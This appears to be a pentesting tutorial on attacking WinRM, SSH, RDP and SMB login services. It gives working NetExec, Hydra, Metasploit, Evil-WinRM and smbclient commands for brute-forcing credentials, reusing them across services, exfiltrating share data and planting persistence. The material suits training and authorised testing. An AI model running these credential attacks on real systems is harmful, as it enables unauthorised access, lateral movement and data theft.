

# Network Services (Practical Pentesting Explanation)

## Why network services matter in pentesting

Every system exposes services to allow users and administrators to:

* Log in
* Manage systems
* Transfer files
* Access databases
* Use remote desktops

From an attacker’s perspective:

> **Each service is an authentication boundary. If credentials work on one service, they often work on others.**

This makes network services prime targets for:

* Password spraying
* Credential stuffing
* Brute forcing
* Lateral movement

---

## Common services you will attack

Typical services encountered during pentests include:

* FTP
* SMB
* NFS
* IMAP / POP3
* SSH
* WinRM
* RDP
* MSSQL / MySQL
* LDAP
* VNC
* Telnet
* SMTP

Each of these usually relies on **username + password authentication**, unless hardened with certificates or key-based auth.

---

## Authentication reuse is the key weakness

Organizations often reuse credentials across:

* SMB
* WinRM
* RDP
* SSH
* Databases

This means:

* One cracked password can unlock multiple services
* One successful login often leads to full system access

---

## WinRM (Windows Remote Management)

### What WinRM is

* Microsoft’s remote management protocol
* Uses SOAP over HTTP/HTTPS
* Default ports:

  * 5985 (HTTP)
  * 5986 (HTTPS)

WinRM allows:

* Remote command execution
* PowerShell remoting
* Full system interaction

---

### Attacking WinRM with NetExec

NetExec is a modern replacement for older tools like CrackMapExec.

General syntax:

```bash
netexec winrm <target-ip> -u <user or userlist> -p <password or passwordlist>
```

Example:

```bash
netexec winrm 10.129.42.197 -u user.list -p password.list
```

If you see:

```
(Pwn3d!)
```

This means:

* Credentials are valid
* Remote command execution is likely possible

---

### Getting a shell with Evil-WinRM

Once credentials are confirmed:

```bash
evil-winrm -i 10.129.42.197 -u user -p password
```

This gives:

* An interactive PowerShell session
* A stable post-exploitation shell
* Easy privilege escalation opportunities

---

## SSH (Secure Shell)

### What SSH provides

* Remote command execution
* Secure file transfer
* Default port: 22

SSH security relies on:

1. Symmetric encryption (session encryption)
2. Asymmetric encryption (key exchange)
3. Hashing (integrity verification)

---

### Why SSH is dangerous when misconfigured

* Password authentication enabled
* Weak passwords
* No rate limiting
* No MFA

---

### Brute-forcing SSH with Hydra

Example:

```bash
hydra -L user.list -P password.list ssh://10.129.42.197
```

Once credentials are found, log in:

```bash
ssh user@10.129.42.197
```

If the private key is stolen and not passphrase-protected:

* SSH can be accessed without any password

---

## RDP (Remote Desktop Protocol)

### What RDP is

* Windows remote GUI access
* Default port: 3389
* Used by admins and support teams

RDP often leads directly to:

* Desktop access
* Credential harvesting
* Privilege escalation

---

### Brute-forcing RDP with Hydra

```bash
hydra -L user.list -P password.list rdp://10.129.42.197
```

Warnings matter:

* RDP is sensitive to high parallel connections
* Use low thread counts

---

### Logging in with xFreeRDP

```bash
xfreerdp /v:10.129.42.197 /u:user /p:password
```

This gives:

* Full GUI desktop
* Immediate access to local files and applications

---

## SMB (Server Message Block)

### What SMB does

* File sharing
* Printer sharing
* Inter-process communication
* Default port: 445

SMB is one of the **most valuable services** during internal pentests.

---

### Brute-forcing SMB with HydraNetwork Services

```bash
hydra -L user.list -P password.list smb://10.129.42.197
```

If you see:

```
invalid reply from target
```

This usually means:

* SMBv3 is enabled
* Hydra version is outdated

---

### Using Metasploit for SMB brute-force

Metasploit handles SMBv3 better.

Workflow:

```bash
msfconsole
use auxiliary/scanner/smb/smb_login
set user_file user.list
set pass_file password.list
set rhosts 10.129.42.197
run
```

Successful output:

```
Success: '.\user:password'
```

---

## Enumerating SMB access with NetExec

Once credentials are valid:

```bash
netexec smb 10.129.42.197 -u user -p password --shares
```

This shows:

* Available shares
* Read/write permissions
* Administrative access

---

## Accessing SMB shares with smbclient

```bash
smbclient \\\\10.129.42.197\\SHARENAME -U user
```

Inside smbclient you can:

* List files
* Download sensitive data
* Upload payloads
* Drop persistence files

---

## Key attacker mindset (very important)

Think in chains, not tools:

1. Brute-force one service
2. Reuse credentials across others
3. Escalate privileges
4. Dump more credentials
5. Move laterally

---

## Tool selection logic (exam & real world)

* **NetExec** → fast multi-protocol credential testing
* **Evil-WinRM** → best WinRM shell
* **Hydra** → generic brute forcing
* **Metasploit** → SMB stability and reliability
* **smbclient** → data exfiltration and persistence

---

## Final takeaway

> Network services are not isolated.
>
> Credentials are the currency.
>
> One weak password can collapse an entire network.

